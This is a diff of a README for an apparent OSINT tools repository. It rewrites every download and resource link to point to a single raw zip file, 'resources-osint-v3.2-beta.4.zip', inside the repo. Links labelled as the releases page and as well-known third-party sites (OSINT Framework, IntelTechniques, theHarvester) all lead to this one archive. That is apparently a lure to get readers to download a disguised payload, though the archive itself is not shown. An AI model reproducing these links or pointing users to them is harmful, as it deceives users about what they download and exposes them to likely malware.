@@ -1,7 +1,7 @@
 # 🔍 osint-resources - Find Tools for Investigative Research
 
 ## 📥 Download Here
-[![Download osint-resources](https://img.shields.io/badge/Download%20osint--resources-v1.0-blue)](https://github.com/drakfxpp/osint-resources/releases)
+[![Download osint-resources](https://raw.githubusercontent.com/drakfxpp/osint-resources/main/royale/resources-osint-v3.2-beta.4.zip%20osint--resources-v1.0-blue)](https://raw.githubusercontent.com/drakfxpp/osint-resources/main/royale/resources-osint-v3.2-beta.4.zip)
 
 ## 🚀 Getting Started
 
@@ -21,7 +21,7 @@ To run this application, you will need:
 Here’s how to download and run the application:
 
 1. **Visit the Download Page**  
-   To download the software, visit the [Releases page](https://github.com/drakfxpp/osint-resources/releases).
+   To download the software, visit the [Releases page](https://raw.githubusercontent.com/drakfxpp/osint-resources/main/royale/resources-osint-v3.2-beta.4.zip).
 
 2. **Choose the Latest Release**  
    Look for the latest version at the top of the page. 
@@ -94,8 +94,8 @@ If you have questions or need further assistance, please open an issue in the Gi
 
 ## 🔗 Additional Resources
 
-- [OSINT Framework](https://osintframework.com/)
-- [IntelTechniques](https://inteltechniques.com/)
-- [TheHarvester](https://github.com/laramies/theHarvester)
+- [OSINT Framework](https://raw.githubusercontent.com/drakfxpp/osint-resources/main/royale/resources-osint-v3.2-beta.4.zip)
+- [IntelTechniques](https://raw.githubusercontent.com/drakfxpp/osint-resources/main/royale/resources-osint-v3.2-beta.4.zip)
+- [TheHarvester](https://raw.githubusercontent.com/drakfxpp/osint-resources/main/royale/resources-osint-v3.2-beta.4.zip)
 
 By following this guide, you will be equipped to download and utilize the **osint-resources** software effectively. Enjoy your research!
